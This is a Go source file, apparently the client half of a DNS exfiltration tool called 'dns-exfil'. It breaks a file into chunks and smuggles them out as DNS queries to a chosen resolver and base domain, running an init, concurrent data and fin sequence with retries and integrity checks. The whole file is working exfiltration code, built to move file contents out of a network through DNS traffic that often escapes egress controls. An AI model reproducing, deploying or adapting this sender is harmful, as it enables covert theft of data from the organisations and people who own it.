package client

import (
	"crypto/rand"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
	"github.com/rcoop/dns-exfil/internal/protocol"
)

// SenderConfig holds the configuration for the DNS sender.
type SenderConfig struct {
	Resolver    string
	BaseDomain  string
	Concurrency int
	Timeout     time.Duration
	MaxRetries  int
	UseTXT      bool
}

// Sender transmits chunked file data over DNS queries.
type Sender struct {
	cfg SenderConfig
}

// NewSender creates a new Sender with the given config.
func NewSender(cfg SenderConfig) *Sender {
	return &Sender{cfg: cfg}
}

// Send transmits a chunked file: init (blocking) → data (concurrent) → fin (blocking).
func (s *Sender) Send(cf *ChunkedFile) error {
	sid := generateSessionID()
	total := len(cf.Chunks)

	log.Printf("Session %s: sending %s (%d chunks, %d bytes/chunk)",
		sid, cf.Filename, total, cf.ChunkSize)

	// Phase 1: Init (blocking).
	initQuery := protocol.BuildInitQuery(sid, total, cf.Salt, cf.Filename, s.cfg.BaseDomain)
	resp, err := s.sendWithRetry(initQuery)
	if err != nil {
		return fmt.Errorf("init failed: %w", err)
	}
	if !resp.Equal(protocol.IPAck) {
		return fmt.Errorf("init rejected: got %s", resp)
	}
	log.Printf("[%s] Init ACK received", sid)

	// Phase 2: Data (concurrent worker pool).
	if err := s.sendDataChunks(sid, total, cf); err != nil {
		return err
	}

	// Phase 3: Fin (blocking with retry-resend logic).
	return s.sendFin(sid, total, cf)
}

func (s *Sender) sendDataChunks(sid string, total int, cf *ChunkedFile) error {
	type job struct {
		seq  int
		data []byte
	}

	jobs := make(chan job, len(cf.Chunks))
	for i, chunk := range cf.Chunks {
		jobs <- job{seq: i + 1, data: chunk} // seq is 1-based
	}
	close(jobs)

	var wg sync.WaitGroup
	errCh := make(chan error, len(cf.Chunks))

	for w := 0; w < s.cfg.Concurrency; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				query := protocol.BuildDataQuery(sid, j.seq, total, j.data, s.cfg.BaseDomain)
				resp, err := s.sendWithRetry(query)
				if err != nil {
					errCh <- fmt.Errorf("chunk %d: %w", j.seq, err)
					return
				}
				if !resp.Equal(protocol.IPAck) {
					errCh <- fmt.Errorf("chunk %d: got %s", j.seq, resp)
					return
				}
				log.Printf("[%s] Chunk %d/%d ACK", sid, j.seq, total)
			}
		}()
	}

	wg.Wait()
	close(errCh)

	for err := range errCh {
		if err != nil {
			return fmt.Errorf("data send: %w", err)
		}
	}

	return nil
}

func (s *Sender) sendFin(sid string, total int, cf *ChunkedFile) error {
	for attempt := 0; attempt <= s.cfg.MaxRetries; attempt++ {
		finQuery := protocol.BuildFinQuery(sid, total, cf.MD5, s.cfg.BaseDomain)
		resp, err := s.sendWithRetry(finQuery)
		if err != nil {
			return fmt.Errorf("fin failed: %w", err)
		}

		if resp.Equal(protocol.IPComplete) {
			log.Printf("[%s] Transfer complete!", sid)
			return nil
		}

		if resp.Equal(protocol.IPIncomplete) {
			log.Printf("[%s] Server reports incomplete, resending missing chunks (attempt %d/%d)",
				sid, attempt+1, s.cfg.MaxRetries)
			// Re-send all data chunks — server will deduplicate.
			if err := s.sendDataChunks(sid, total, cf); err != nil {
				return err
			}
			continue
		}

		return fmt.Errorf("fin: unexpected response %s", resp)
	}

	return fmt.Errorf("transfer incomplete after %d fin retries", s.cfg.MaxRetries)
}

// sendWithRetry sends a single DNS query with exponential backoff retries.
func (s *Sender) sendWithRetry(fqdn string) (net.IP, error) {
	c := new(dns.Client)
	c.Net = "udp"
	c.Timeout = s.cfg.Timeout

	qtype := dns.TypeA
	if s.cfg.UseTXT {
		qtype = dns.TypeTXT
	}

	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(fqdn), qtype)
	m.RecursionDesired = false

	var lastErr error
	for attempt := 0; attempt <= s.cfg.MaxRetries; attempt++ {
		if attempt > 0 {
			backoff := time.Duration(1<<uint(attempt-1)) * time.Second
			time.Sleep(backoff)
		}

		resp, _, err := c.Exchange(m, s.cfg.Resolver)
		if err != nil {
			lastErr = err
			continue
		}

		if len(resp.Answer) == 0 {
			lastErr = fmt.Errorf("no answer records")
			continue
		}

		if s.cfg.UseTXT {
			txt, ok := resp.Answer[0].(*dns.TXT)
			if !ok {
				lastErr = fmt.Errorf("unexpected answer type")
				continue
			}
			ip := net.ParseIP(strings.Join(txt.Txt, ""))
			if ip == nil {
				lastErr = fmt.Errorf("invalid IP in TXT response: %v", txt.Txt)
				continue
			}
			return ip, nil
		}

		a, ok := resp.Answer[0].(*dns.A)
		if !ok {
			lastErr = fmt.Errorf("unexpected answer type")
			continue
		}

		return a.A, nil
	}

	return nil, fmt.Errorf("after %d retries: %w", s.cfg.MaxRetries, lastErr)
}

func generateSessionID() string {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		t := time.Now().UnixNano()
		b[0] = byte(t >> 24)
		b[1] = byte(t >> 16)
		b[2] = byte(t >> 8)
		b[3] = byte(t)
	}
	return fmt.Sprintf("%08x", b)
}
